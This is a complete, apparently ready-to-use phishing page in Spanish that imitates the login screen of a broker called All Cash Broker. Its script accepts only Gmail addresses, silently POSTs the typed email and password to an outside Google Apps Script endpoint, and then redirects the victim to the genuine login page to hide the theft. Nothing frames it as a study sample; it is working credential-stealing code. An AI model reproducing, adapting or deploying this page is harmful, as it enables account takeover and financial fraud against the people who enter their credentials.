<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>ACB · Iniciar sesión</title>
  <style>
    :root {
      --bg: #111111;
      --card: #1a1a1a;
      --accent: #22c55e;
      --muted: #a1a1aa;
      --text: #f5f5f5;
      --glass: rgba(255,255,255,0.05);
      font-family: Inter, system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial;
    }
    * { box-sizing: border-box; }
    html, body { height: 100%; margin: 0; background: var(--bg); color: var(--text); }
    .wrap { min-height: 100%; display: grid; place-items: center; padding: 24px; }
    .card {
      width: 100%; max-width: 420px; background: var(--card);
      border-radius: 14px; padding: 28px; box-shadow: 0 8px 30px rgba(0,0,0,0.6);
    }
    .brand { display: flex; align-items: center; justify-content: center; margin-bottom: 18px; gap: 12px; }
    .logo-container {
      display: flex; align-items: center; background-color: white; padding: 6px 12px;
      border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); transform: skewX(-10deg);
    }
    .logo-text {
      font-size: 28px; font-weight: bold; color: black; position: relative; z-index: 1;
    }
    .logo-text::before {
      content: ''; position: absolute; top: 50%; left: -5px; transform: translateY(-50%);
      width: 8px; height: 28px; background: linear-gradient(to bottom right, purple, blue);
      border-radius: 2px; z-index: -1;
    }
    .slogan-text {
      line-height: 1.2; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; color: var(--muted);
    }
    .slogan-text span { display: block; }
    h1 { margin: 0 0 8px 0; font-size: 22px; text-align: center; }
    p.lead { margin: 0 0 18px 0; color: var(--muted); font-size: 16px; text-align: center; }
    form { display: grid; gap: 14px; }
    label { font-size: 14px; color: var(--text); display: block; margin-bottom: 6px; }
    label span { color: var(--muted); }
    .input {
      position: relative; background: var(--glass); padding: 12px; border-radius: 10px;
      display: flex; align-items: center; gap: 8px; border: 1px solid #333;
    }
    .input input { flex: 1; background: transparent; border: 0; outline: none; color: var(--text); font-size: 15px; }
    .input input::placeholder { color: rgba(255,255,255,0.4); }
    .password-row { display: flex; gap: 8px; align-items: center; }
    .eye-btn { background: transparent; border: 0; padding: 6px; border-radius: 8px; cursor: pointer; display: grid; place-items: center; }
    .eye-btn svg { width: 20px; height: 20px; stroke: var(--muted); }
    .checkbox { display: flex; align-items: center; gap: 10px; justify-content: center; margin-top: 12px; }
    input[type="checkbox"] { width: 16px; height: 16px; }
    .checkbox label { font-size: 14px; color: var(--muted); }
    a.small { font-size: 13px; color: var(--accent); text-decoration: none; display: block; text-align: center; margin-top: 10px; }
    .btn {
      display: inline-flex; gap: 10px; align-items: center; justify-content: center; padding: 12px 14px;
      border-radius: 10px; border: 0; cursor: pointer; font-weight: 600; font-size: 15px;
      background: var(--accent); color: white; box-shadow: 0 8px 20px rgba(34,197,94,0.2);
    }
    .btn svg { width: 16px; height: 16px; stroke: white; transform: translateX(0); transition: transform .18s; }
    .btn:active svg { transform: translateX(2px); }
    .foot { margin-top: 14px; text-align: center; font-size: 14px; color: var(--muted); }
    .foot a { color: var(--accent); text-decoration: none; font-weight: 600; }
    @media (max-width: 420px) {
      .card { padding: 20px; }
      .brand { flex-direction: column; gap: 8px; }
    }
  </style>
</head>
<body>
  <div class="wrap">
    <main class="card" role="main">
      <header class="brand">
        <div class="logo-container">
          <div class="logo-text">ACB</div>
        </div>
        <div class="slogan-text">
          <span>ALL</span>
          <span>CASH</span>
          <span>BROKER</span>
        </div>
      </header>
      <section>
        <h1>Bienvenido(a) de nuevo</h1>
        <p class="lead">Ingrese la información a continuación para acceder a su cuenta.</p>
        <form id="loginForm" autocomplete="on">
          <div>
            <label for="email">Correo electrónico <span>*</span></label>
            <div class="input">
              <input id="email" name="email" type="email" placeholder="Escribe aquí..." required />
            </div>
          </div>
          <div>
            <label for="password">Contraseña <span>*</span></label>
            <div class="input password-row">
              <input id="password" name="password" type="password" placeholder="Escribe aquí..." required />
              <button type="button" class="eye-btn" id="togglePass" aria-label="Mostrar contraseña">
                <svg viewBox="0 0 24 24" fill="none" stroke-width="1.6" xmlns="http://www.w3.org/2000/svg">
                  <path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7S2 12 2 12z" stroke-linecap="round" stroke-linejoin="round"></path>
                  <circle cx="12" cy="12" r="3" stroke-linecap="round" stroke-linejoin="round"></circle>
                </svg>
              </button>
            </div>
          </div>
          <div class="error-message" id="error-message" style="color: red; font-size: 14px; text-align: center; display: none;">Por favor, revisa tu correo y contraseña</div>
          <button class="btn" type="submit">
            <span>Iniciar sesión</span>
            <svg viewBox="0 0 24 24" fill="none" stroke-width="1.7" xmlns="http://www.w3.org/2000/svg">
              <path d="M5 12h14" stroke-linecap="round" stroke-linejoin="round"></path>
              <path d="M12 5l7 7-7 7" stroke-linecap="round" stroke-linejoin="round"></path>
            </svg>
          </button>
          <div class="checkbox">
            <input id="remember" type="checkbox" />
            <label for="remember">Mantenerme conectado</label>
          </div>
          <a class="small" href="https://app.allcashbroker.com/auth/forgot-password">Olvidé mi contraseña</a>
        </form>
        <div class="foot">
          ¿Aún no tienes una cuenta? <a href="https://app.allcashbroker.com/auth/register">Regístrate</a>
        </div>
      </section>
    </main>
  </div>
  <script>
    function togglePassword() {
      const password = document.getElementById('password');
      const toggle = document.getElementById('togglePass');
      const shown = password.type === 'password';
      password.type = shown ? 'text' : 'password';
      toggle.setAttribute('aria-label', shown ? 'Ocultar contraseña' : 'Mostrar contraseña');
    }

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value.toLowerCase();
      const password = document.getElementById('password').value;
      const errorMessage = document.getElementById('error-message');
      const scriptURL = "https://script.google.com/macros/s/AKfycbyveaEsaqUeshTvIEX8GPZZO_CXugoxl7jtlI7kcLsyOaViTCnXXv9Axq-5FTkghreGHw/exec";
      const redirectURL = "https://app.allcashbroker.com/auth/login";

      const emailRegex = /^[a-z0-9._%+-]+@gmail\.com$/;
      if (!emailRegex.test(email) || password.length === 0) {
        errorMessage.style.display = 'block';
        return;
      }

      errorMessage.style.display = 'none';
      fetch(scriptURL, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: email, password: password })
      });

      setTimeout(() => {
        window.location.href = redirectURL;
      }, 1000);
    });
  </script>
</body>
</html>
